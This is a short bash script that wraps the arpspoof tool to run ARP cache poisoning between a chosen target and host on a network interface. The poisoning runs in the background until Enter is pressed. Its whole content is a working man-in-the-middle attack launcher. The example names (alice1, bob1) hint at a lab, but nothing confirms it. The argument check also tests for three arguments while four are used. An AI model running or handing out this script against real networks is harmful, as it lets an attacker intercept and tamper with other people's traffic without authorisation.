# if the number of arguments is less than 3 then print the usage message
if [ $# -lt 3 ]; then
    echo "Usage: $0 <interface> <client> <target> <host>"
    echo "Example: $0 eth0 own alice1 bob1"
    exit 1
fi

arpspoof -i $1 -c $2 -t $3 -r $4 > /dev/null 2>&1 & pid=$!

read -p "Press [Enter] to stop the ARP poisoning..."
kill $pid